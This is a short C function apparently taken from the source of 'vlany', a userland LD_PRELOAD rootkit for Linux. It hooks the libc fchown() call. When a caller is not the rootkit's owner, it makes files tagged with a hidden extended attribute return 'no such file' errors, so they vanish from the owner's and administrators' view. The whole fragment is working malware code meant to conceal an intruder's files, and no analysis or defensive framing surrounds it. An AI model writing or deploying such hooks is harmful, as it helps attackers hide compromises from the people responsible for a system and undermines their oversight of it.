int fchown(int fildes, uid_t owner, gid_t group)
{
    #ifdef DEBUG
        printf("[vlany] fchown() called\n");
    #endif

    HOOK(old_fchown, CFCHOWN);

    if(owned()) return old_fchown(fildes, owner, group);

    if(hidden_fxattr(fildes)) { errno = ENOENT; return -1; }

    return old_fchown(fildes, owner, group);
}
